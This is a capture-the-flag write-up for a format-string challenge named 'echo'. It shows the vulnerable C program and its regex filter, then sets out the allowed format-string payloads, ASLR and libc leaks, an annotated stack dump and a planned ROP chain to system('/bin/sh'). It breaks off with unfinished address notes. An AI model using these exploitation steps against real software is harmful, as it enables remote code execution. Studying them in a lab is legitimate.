# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "echo"
- story:  no story :/
- start docker:
```
docker compose up
nc 127.0.0.1 1024
```
- we have the following C-code
```c
int main(void)
{
    char buf[128];
    regex_t re;
    int result;

    /*
     * The overall syntax of a conversion specification is
     *   %[$][flags][width][.precision][length modifier]conversion
     * (as per `man 3 printf`)
     * So we just filter for %n...
     * Surely it is safe now (<- clueless)
     */

    if ((result = regcomp(&re, "%\\$?[-#0 +'I]*(\\*|[1-9][0-9]*)?(\\.(\\*|[1-9][0-9]*))?([hlqLjzZt]|ll|hh)?n", REG_EXTENDED | REG_NOSUB))) {
        regerror(result, &re, buf, sizeof(buf));
        errx(1, "Failed to compile regex: %s", buf);
    }

    setbuf(stdout, NULL);
    while (fgets(buf, sizeof(buf), stdin)) {
        if (regexec(&re, buf, 0, NULL, 0) != REG_NOMATCH)
            errx(1, "Hacking attempt detected!");
        printf(buf);
    }
}
```
-lets analyze the regex
```c
"%\\$?[-#0 +'I]*(\\*|[1-9][0-9]*)?(\\.(\\*|[1-9][0-9]*))?([hlqLjzZt]|ll|hh)?n"
```
- the double \\ just means that the c code contains a \, which itself esacpes the $ in the regex (else $ means finish)=> \\$ just means $
```c
"%$?  [-#0 +'I]*  (*|[1-9][0-9]*)?  (.(*|[1-9][0-9]*))?  ([hlqLjzZt]|ll|hh)?  n"
```
- below are format strings that are allowed
```
%42x     <-- write arbitrary (hardcoded) # chars
%2$*1$d  <-- leak value (as int) of first parameter ()

```


## 1) leak ASLR:
- print 64-bit values of (rdi, rsi, rdx, rcx, r8, r9, stack) in hex via
```
%1$llx
%2$llx
%3$llx
...
%400$llx
```
- 48-bit (6-Byte) values are addresses
- 64-bit values (just before an 48-bit return address) is probably the canary (same for all stackframes)
- the 35-th value is an address of libc
```
%35$llx
```

## 2) find out where stack is
i printed recognizable chars into the buffer of the stack, and then printed a vakue:
```
AAAAAAAABBBBBBBB%1$llx
```
```
rdi = 0x18
rsi = 0x1
rdx = 0x0
rcx = 0x7ffe84ee0d00                            <-- this is the address of the start of the buffer
 r8 = 0x17
 r9 = 0x5695a9ede3b0
ret + 8 (input 7) = 0xe0
ret + 16 (input 8) = 0xe0
ret + 24 (input 9) = 0x3b2fc
ret + 32 (input 10) = 0x5695a9ede2a0
ret + 40 (input 11) = 0x0
ret + 48 (input 12) = 0x4
ret + 56 (input 13) = 0x18
ret + 64 (input 14) = 0x4141414141414141        <-- buffer starts here (128Bytes = 8*16 Bytes)
ret + 72 (input 15) = 0x4242424242424242    
ret + 80 (input 16) = 0xa786c6c24363125
ret + 88 (input 17) = 0x0
ret + 96 (input 18) = 0x0
ret + 104 (input 19) = 0x0
ret + 112 (input 20) = 0x0
ret + 120 (input 21) = 0x0
ret + 128 (input 22) = 0x0
ret + 136 (input 23) = 0x0
ret + 144 (input 24) = 0x0
ret + 152 (input 25) = 0x0
ret + 160 (input 26) = 0x0
ret + 168 (input 27) = 0x0
ret + 176 (input 28) = 0x0                      <-- buffer ends here (write here address where we want to write to)
ret + 184 (input 29) = 0x0
ret + 192 (input 30) = 0x0
ret + 200 (input 31) = 0xd5e379c229233300       <-- probably canary (we do not need it)
ret + 208 (input 32) = 0x0
ret + 216 (input 33) = 0x0
ret + 224 (input 34) = 0x1
ret + 232 (input 35) = 0x767384029d90           <-- return address override with first rop gadget (pop rdi; ret;)
ret + 240 (input 36) = 0x0                      <-- write pointer to \bin\sh here (gets popped)
ret + 248 (input 37) = 0x5695a88340c0           <-- write pointer to system here (will return)
ret + 256 (input 38) = 0x100000000
ret + 264 (input 39) = 0x7ffe84ee0eb8
ret + 272 (input 40) = 0x0
ret + 280 (input 41) = 0x10276163c33eb5ef
ret + 288 (input 42) = 0x7ffe84ee0eb8
ret + 296 (input 43) = 0x5695a88340c0
ret + 304 (input 44) = 0x5695a8836dd8
ret + 312 (input 45) = 0x76738430e040
ret + 320 (input 46) = 0xefda68bfd85cb5ef
ret + 328 (input 47) = 0xfcc06966f9b4b5ef
ret + 336 (input 48) = 0x767300000000
ret + 344 (input 49) = 0x0
ret + 352 (input 50) = 0x0
ret + 360 (input 51) = 0x0
ret + 368 (input 52) = 0x0
ret + 376 (input 53) = 0xd5e379c229233300
ret + 384 (input 54) = 0x0
ret + 392 (input 55) = 0x767384029e40           <-- this is a libc pointer, clear lower 19bits to get aslr offset
```
- we want to override input 35, 36 and 37
- later on we break out of loop by sending forbidden input and hopefully trigger rop chain
- we can make our live easy and only write 8 Bytes at a time, then do another loop iteration, then we do not need to care about only writing higher and higher bytes
- first we write to "address" = start_of_buffer + 168 
    - we achieve this by writing "address" into first 8 bytes of buffer
    - then writing to the 14-th argument (is start of buffer), gets interpreted as pointer
    - thus we write to the memory we want to: "address"

- then we write to start_of_buffer + 168 + 8 = 176
- tehn we write to start_of_buffer + 168 + 8 + 8 = 184


0x7ffd6782c490

ret + 400 = 0x7ffd6782c658


ret + 264 = 0x7ffd6782c648
ret + 448 = 0x7ffd6782c640
ret + 480 = 0x7ffd6782c638



